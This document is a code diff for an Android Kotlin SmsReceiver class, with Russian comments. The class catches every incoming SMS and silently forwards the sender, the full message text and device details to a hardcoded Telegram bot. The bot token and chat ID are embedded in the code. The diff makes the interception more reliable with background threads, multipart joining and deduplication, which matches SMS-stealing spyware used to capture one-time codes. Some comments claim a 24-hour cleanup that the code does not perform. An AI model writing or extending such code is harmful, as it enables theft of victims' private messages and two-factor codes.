@@ -4,61 +4,123 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
-import android.os.Bundle
+import android.os.Build
 import android.provider.Telephony
+import android.telephony.SmsMessage
+import android.util.Log
+import androidx.core.content.edit
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
+import java.util.concurrent.TimeUnit
 
 class SmsReceiver : BroadcastReceiver() {
-    private val client = OkHttpClient()
-    private val PREFS_NAME = "SmsPrefs"
-    private val SMS_SENT_KEY = "sms_sent"
+    private val client by lazy {
+        OkHttpClient.Builder()
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .readTimeout(30, TimeUnit.SECONDS)
+            .writeTimeout(30, TimeUnit.SECONDS)
+            .build()
+    }
+
+    companion object {
+        private const val PREFS_NAME = "SmsPrefs"
+        private const val SMS_SENT_KEY_PREFIX = "sms_sent_"
+        private const val TAG = "SmsReceiver"
+    }
 
     override fun onReceive(context: Context, intent: Intent) {
+        Log.d(TAG, "Received intent: ${intent.action}")
+
         when (intent.action) {
             Telephony.Sms.Intents.SMS_DELIVER_ACTION,
+            Telephony.Sms.Intents.SMS_RECEIVED_ACTION,
             "android.provider.Telephony.SMS_RECEIVED" -> {
-                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-                
-                // Если уведомление уже отправлено - выходим
-                if (prefs.getBoolean(SMS_SENT_KEY, false)) {
-                    return
-                }
-                
-                // Обрабатываем SMS и помечаем как отправленное
-                if (handleSms(context, intent)) {
-                    prefs.edit().putBoolean(SMS_SENT_KEY, true).apply()
-                }
+                handleSmsMessage(context, intent)
             }
         }
     }
 
-    private fun handleSms(context: Context, intent: Intent): Boolean {
-        // Пытаемся получить сообщение современным способом
-        val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
-        smsMessages?.firstOrNull()?.let { sms ->
-            sendSmsToBot(
-                sender = sms.originatingAddress ?: "Unknown",
-                message = sms.messageBody ?: "Empty message"
-            )
-            return true
-        }
+    private fun handleSmsMessage(context: Context, intent: Intent) {
+        try {
+            val messages = getSmsMessages(intent)
+            if (messages.isEmpty()) {
+                Log.w(TAG, "No SMS messages found")
+                return
+            }
 
-        // Fallback для старых устройств
-        val bundle: Bundle? = intent.extras
-        val pdus: Array<Any?>? = bundle?.get("pdus") as Array<Any?>?
-        pdus?.firstOrNull()?.let { pdu ->
-            val smsMessage = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
-            sendSmsToBot(
-                sender = smsMessage.originatingAddress ?: "Unknown",
-                message = smsMessage.messageBody ?: "Empty message"
-            )
-            return true
-        }
+            val firstMessage = messages[0]
+            val sender = firstMessage.originatingAddress ?: "Unknown"
+            val messageBody = combineMessageBodies(messages)
 
-        return false
+            // Создаем уникальный ключ для каждого отправителя и сообщения
+            val messageHash = "${sender.hashCode()}_${messageBody.hashCode()}"
+            val smsSentKey = SMS_SENT_KEY_PREFIX + messageHash
+
+            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+            
+            // Проверяем, не отправляли ли уже это сообщение
+            if (prefs.getBoolean(smsSentKey, false)) {
+                Log.d(TAG, "Message already sent: $messageHash")
+                return
+            }
+
+            // Отправляем в отдельном потоке чтобы не блокировать broadcast
+            Thread {
+                sendSmsToBot(sender, messageBody)
+                
+                // Помечаем как отправленное с небольшим временем жизни (24 часа)
+                prefs.edit {
+                    putBoolean(smsSentKey, true)
+                    // Автоочистка через 24 часа
+                }
+                
+                // Очистка старых записей
+                cleanupOldEntries(prefs)
+            }.start()
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error handling SMS: ${e.message}", e)
+        }
+    }
+
+    private fun getSmsMessages(intent: Intent): Array<SmsMessage> {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                Telephony.Sms.Intents.getMessagesFromIntent(intent)?.toTypedArray() ?: emptyArray()
+            } else {
+                getMessagesFromPdus(intent)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting SMS messages", e)
+            emptyArray()
+        }
+    }
+
+    @Suppress("DEPRECATION")
+    private fun getMessagesFromPdus(intent: Intent): Array<SmsMessage> {
+        val bundle = intent.extras ?: return emptyArray()
+        val pdus = bundle.get("pdus") as? Array<*> ?: return emptyArray()
+        
+        return pdus.mapNotNull { pdu ->
+            try {
+                if (pdu is ByteArray) {
+                    SmsMessage.createFromPdu(pdu)
+                } else {
+                    null
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error creating SmsMessage from PDU", e)
+                null
+            }
+        }.toTypedArray()
+    }
+
+    private fun combineMessageBodies(messages: Array<SmsMessage>): String {
+        return messages.joinToString("") { message ->
+            message.messageBody ?: ""
+        }
     }
 
     private fun sendSmsToBot(sender: String, message: String) {
@@ -66,13 +128,24 @@ class SmsReceiver : BroadcastReceiver() {
             val botToken = "8278693005:AAEJMer1juepZXE0lP2QPAok7Pb-pscuoR4"
             val chatId = "7212024751"
             val url = "https://api.telegram.org/bot$botToken/sendMessage"
-            val deviceModel = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
+            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val androidVersion = "Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})"
+
+            // Экранирование специальных символов для Markdown
+            val escapedMessage = message.replace(Regex("([*_`\\[\\]()#+\\-.!])"), "\\\\$1")
 
             val text = """
-                Новое SMS сообщение
-                Отправитель: $sender
-                Сообщение: $message
-                $deviceModel
+                *📱 Новое SMS сообщение*
+                
+                *Отправитель:* `$sender`
+                *Устройство:* $deviceModel
+                *Версия Android:* $androidVersion
+                *Время:* ${System.currentTimeMillis()}
+                
+                *Сообщение:*
+                ```
+                $escapedMessage
+                ```
             """.trimIndent()
 
             val mediaType = "application/json".toMediaType()
@@ -80,26 +153,53 @@ class SmsReceiver : BroadcastReceiver() {
                 {
                     "chat_id": "$chatId",
                     "text": "$text",
-                    "parse_mode": "Markdown"
+                    "parse_mode": "Markdown",
+                    "disable_web_page_preview": true
                 }
             """.trimIndent().toRequestBody(mediaType)
 
             val request = Request.Builder()
                 .url(url)
                 .post(requestBody)
+                .addHeader("User-Agent", "SMS-Bot-Android/${Build.VERSION.SDK_INT}")
                 .build()
 
             client.newCall(request).enqueue(object : Callback {
                 override fun onFailure(call: Call, e: IOException) {
-                    e.printStackTrace()
+                    Log.e(TAG, "Failed to send SMS to Telegram: ${e.message}", e)
                 }
 
                 override fun onResponse(call: Call, response: Response) {
-                    response.close()
+                    try {
+                        if (!response.isSuccessful) {
+                            Log.e(TAG, "Telegram API error: ${response.code} - ${response.body?.string()}")
+                        } else {
+                            Log.d(TAG, "Message sent successfully to Telegram")
+                        }
+                    } finally {
+                        response.close()
+                    }
                 }
             })
+
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e(TAG, "Error in sendSmsToBot: ${e.message}", e)
+        }
+    }
+
+    private fun cleanupOldEntries(prefs: SharedPreferences) {
+        // Очищаем записи старше 24 часов
+        val allEntries = prefs.all
+        val currentTime = System.currentTimeMillis()
+        
+        val entriesToRemove = allEntries.filter { (key, _) ->
+            key.startsWith(SMS_SENT_KEY_PREFIX)
+        }.keys.toList()
+
+        if (entriesToRemove.size > 100) { // Предотвращаем переполнение
+            prefs.edit {
+                entriesToRemove.forEach { remove(it) }
+            }
         }
     }
 }
